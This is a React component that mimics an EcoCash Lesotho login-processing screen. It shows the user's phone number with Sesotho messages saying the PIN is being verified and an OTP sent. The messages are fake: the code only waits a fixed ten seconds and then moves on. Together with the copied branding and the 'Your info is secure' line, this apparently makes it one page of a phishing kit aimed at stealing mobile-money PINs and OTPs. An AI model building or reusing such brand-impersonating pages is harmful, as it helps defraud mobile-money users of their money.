import { useEffect } from 'react'

interface LoginProcessingProps {
  phoneNumber: string
  onProcessingComplete: () => void
}

const LoginProcessing = ({ phoneNumber, onProcessingComplete }: LoginProcessingProps) => {
  useEffect(() => {
    // Show processing for exactly 10 seconds
    const timer = setTimeout(() => {
      onProcessingComplete()
    }, 10000)

    return () => clearTimeout(timer)
  }, [onProcessingComplete])

  return (
    <div className="min-h-screen flex items-center justify-center overflow-hidden relative bg-[#f7f9fc]">
      {/* Background */}
      <div className="absolute inset-0 -z-10 opacity-40">
        <div className="absolute top-[-20%] right-[-20%] w-full h-full bg-gradient-to-br from-transparent via-transparent to-[#e0e6f0]"></div>
        <div className="absolute bottom-[-20%] left-[-20%] w-full h-full bg-gradient-to-tr from-[#e0e6f0] via-transparent to-transparent"></div>
      </div>

      <div className="w-full max-w-[440px] px-5 text-center">
        {/* Logo */}
        <div className="text-4xl font-bold mb-10 tracking-tight">
          <span className="text-[#0056a4]">Eco</span>
          <span className="text-[#e11d2d]">Cash</span>
        </div>
        <p className="text-gray-600 mb-4 text-sm">Lesotho</p>

        {/* Processing Card */}
        <div className="bg-white py-16 px-8 rounded-[50px] shadow-[0_10px_30px_rgba(0,0,0,0.05)] border border-[#f0f0f0]">
          {/* Animated Icon */}
          <div className="w-24 h-24 bg-gradient-to-br from-[#0056a4] to-[#12009c] rounded-full flex items-center justify-center mx-auto mb-6 relative">
            <i className="fa-solid fa-lock text-white text-4xl"></i>
            {/* Spinning Ring */}
            <div className="absolute inset-0 border-4 border-transparent border-t-white rounded-full animate-spin"></div>
          </div>

          {/* Title */}
          <h2 className="text-2xl font-bold text-gray-800 mb-3">Re Netefatsa</h2>
          <p className="text-gray-600 text-base mb-2">Verifying Your Account</p>

          {/* Phone Number */}
          <div className="bg-gradient-to-br from-[#f0f7ff] to-[#e6f0ff] rounded-2xl p-4 mb-6 mt-6">
            <p className="text-sm text-gray-600 mb-1">📱 {phoneNumber}</p>
          </div>

          {/* Loading Spinner */}
          <div className="flex justify-center items-center gap-2 mt-6">
            <div className="w-3 h-3 bg-[#0056a4] rounded-full animate-bounce" style={{ animationDelay: '0s' }}></div>
            <div className="w-3 h-3 bg-[#0056a4] rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
            <div className="w-3 h-3 bg-[#0056a4] rounded-full animate-bounce" style={{ animationDelay: '0.4s' }}></div>
          </div>

          {/* Processing Messages */}
          <div className="mt-8 space-y-2 text-sm text-gray-600">
            <p className="animate-pulse">✓ Re netefatsa PIN ea hau...</p>
            <p className="animate-pulse" style={{ animationDelay: '1.5s' }}>✓ Re hlahloba akhaonto ea hau...</p>
            <p className="animate-pulse" style={{ animationDelay: '3s' }}>✓ Re romela OTP...</p>
          </div>
        </div>

        {/* Security Note */}
        <div className="mt-6 text-xs text-gray-500 flex items-center justify-center gap-2">
          <i className="fa-solid fa-shield-halved"></i>
          <span>Lintlha tsa hau li sireletsehile (Your info is secure)</span>
        </div>
      </div>
    </div>
  )
}

export default LoginProcessing
